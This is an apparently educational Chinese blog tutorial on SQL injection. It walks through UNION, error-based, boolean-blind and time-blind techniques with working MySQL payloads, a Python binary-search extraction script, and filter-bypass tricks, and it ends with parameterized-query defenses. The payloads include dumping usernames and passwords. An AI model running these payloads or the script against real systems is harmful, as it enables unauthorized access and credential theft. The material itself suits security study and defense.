SQL 注入：从 union 到盲注的系统梳理

2026.08.20 Web 安全 22 min read

SQL 注入的 payload 在网上到处都是，复制粘贴就能用。 但如果不理解"为什么这段字符串能让数据库吐出数据"， 换个场景就完全不会变通了。

这篇按数据回显能力从强到弱排列：有回显用联合查询， 有报错用报错注入，什么都没有才上盲注。

一、先判定：这里有没有注入

假设后端是这样拼 SQL 的： 

$sql = "SELECT * FROM users WHERE id = " . $_GET['id'];

传入 id=1 时执行的是 WHERE id = 1。 传入 id=1' 时变成 WHERE id = 1'——语法错误，页面报错或空白， 这说明单引号进入了 SQL 语法层，注入点存在。

但更常见的是数字型注入（如上面这段代码），单引号不会报错。 这时候用算术表达式判断： 

id=2-1    → 返回 id=1 的记录？说明表达式被求值了
id=1 and 1=1   → 正常
id=1 and 1=2   → 无结果？布尔条件生效了
判断的核心逻辑只有一句：输入是被当成"数据"还是"代码"。 如果 2-1 被求值成 1，那它就已经是代码了。

二、联合查询注入（有回显）

页面会把查询结果渲染出来时，联合查询是最舒服的方式。 第一步是确定列数，用 ORDER BY 递增试探： 

id=1 ORDER BY 1
id=1 ORDER BY 2
id=1 ORDER BY 3   -- 报错，说明只有 2 列

也可以直接猜：id=1 UNION SELECT 1,2，报错就加列数。 确定列数后，找出哪个位置的内容会被显示在页面上： 

id=-1 UNION SELECT 1,2      -- 让原查询为空，页面显示 1 和 2
id=-1 UNION SELECT 1,database()

接下来就是信息收集的常规流程： 

-- 库名
id=-1 UNION SELECT 1,database()

-- 所有库
id=-1 UNION SELECT 1,group_concat(schema_name) FROM information_schema.schemata

-- 指定库的表
id=-1 UNION SELECT 1,group_concat(table_name)
FROM information_schema.tables WHERE table_schema='security'

-- 指定表的列
id=-1 UNION SELECT 1,group_concat(column_name)
FROM information_schema.columns
WHERE table_schema='security' AND table_name='users'

-- 取数据
id=-1 UNION SELECT 1,group_concat(username,0x3a,password) FROM security.users

这里 0x3a 是冒号的十六进制，用来做分隔符， 避免逗号被过滤。这类小技巧在实战里很常用。

三、报错注入（无回显但有报错）

页面不回显数据，但会把数据库的错误信息打在页面上——这依然是一条信息通道。 原理是构造一个必然报错的表达式，把想查的数据拼进错误信息里。 

-- MySQL 8 之前常用
id=1 AND updatexml(1,concat(0x7e,database(),0x7e),1)
id=1 AND extractvalue(1,concat(0x7e,database(),0x7e))

-- 报错信息里会带出 ~security~
-- MySQL 8 中这两个函数已被移除，改用：
id=1 AND (SELECT 1 FROM (SELECT count(*),concat(database(),floor(rand(0)*2))
         x FROM information_schema.tables GROUP BY x) a)

注意报错注入有个限制：错误信息通常只返回一行（约 32 字符）。 取长数据要用 substr() 分段读。

四、布尔盲注（无回显无报错）

页面上什么数据都没有，但"查询有结果"和"查询无结果"两种状态的页面表现不同 （比如一个显示"欢迎"，一个显示"用户不存在"）。这就是布尔盲注的基础。

思路是把"取数据"转化成"问是非题"： 

-- 库名的第一个字符是不是 s？
id=1 AND substr(database(),1,1)='s'

-- 是不是大于 'a'？
id=1 AND ascii(substr(database(),1,1)) > 97

手工做太慢，实战和 CTF 里都是写脚本二分查找。 核心就是一个循环：对每个位置，二分确定 ASCII 值。 

import requests

def is_true(payload):
    r = requests.get(URL, params={"id": "1 AND " + payload})
    return "欢迎" in r.text        # 用页面差异作为判断信号

def extract(sql, length):
    result = ""
    for pos in range(1, length + 1):
        low, high = 32, 126
        while low < high:
            mid = (low + high) // 2
            if is_true(f"ascii(substr(({sql}),{pos},1))>{mid}"):
                low = mid + 1
            else:
                high = mid
        result += chr(low)
    return result

五、时间盲注（页面完全无差异）

最恶劣的情况：无论查询成功还是失败，页面长得一模一样。 这时候唯一能观测的只剩响应时间。 

-- 条件成立就睡 5 秒
id=1 AND if(substr(database(),1,1)='s', sleep(5), 0)

-- 或用 benchmark 制造耗时
id=1 AND if(1=1, benchmark(5000000, md5(1)), 0)

时间盲注的代价是慢——每个字符都要等一个 sleep。 所以实战中优先找布尔信号，实在没有才用时间。

六、绕过常见过滤

被过滤的内容绕过思路
空格/**/、%09、%0a、括号 ()
逗号用 JOIN 替代 UNION SELECT 1,2 的逗号；substr(x FROM 1 FOR 1)
关键字 select大小写混淆、内联注释 /*!50000select*/
引号十六进制 0x75736572 代替字符串
等号like、regexp、between

绕过的本质是：过滤规则是字符串匹配，而 SQL 解析器认的是语法。 只要找到一种"过滤器不认、但解析器认"的等价写法，就绕过去了。

七、防御：唯一的根本解

所有注入的成因可以归结为一句话：用户输入被拼接进了 SQL 语句。 所以防御也只有一个根本方向——让它不再被拼接。 

// 错误：字符串拼接
String sql = "SELECT * FROM users WHERE name = '" + name + "'";
Statement st = conn.createStatement();
st.executeQuery(sql);

// 正确：预编译 + 参数占位
String sql = "SELECT * FROM users WHERE name = ?";
PreparedStatement ps = conn.prepareStatement(sql);
ps.setString(1, name);
ps.executeQuery();

PreparedStatement 之所以有效，是因为参数值是在 SQL 语句编译完成之后才传入的。数据库引擎已经确定了语法结构， 此时参数无论包含什么字符，都只能被当作数据，不可能变成语法的一部分。

其他辅助措施：

  • 最小权限：Web 应用连接数据库的账号，不要给 FILE、DROP 这类权限。
  • 关闭详细报错：生产环境不要把数据库错误信息返回给前端，否则等于免费提供报错注入通道。
  • WAF 只当兜底：它能挡脚本小子，但挡不住会绕过的攻击者，不能替代参数化。
有个常见的错误做法：用 addslashes 或自己写的转义函数来"过滤"。 这在 GBK 等宽字节编码下会被 %df%27 直接绕过。 转义永远不如参数化可靠。

小结

整篇文章其实就一条主线：先确认信息通道，再选择利用方式。 有回显走联合查询，有报错走报错注入，只有布尔差异走布尔盲注， 什么都没有才上时间盲注。

而防御侧同样只有一条主线：参数化查询。 理解了"编译在前、传值在后"这个顺序，就理解了它为什么能彻底解决注入。
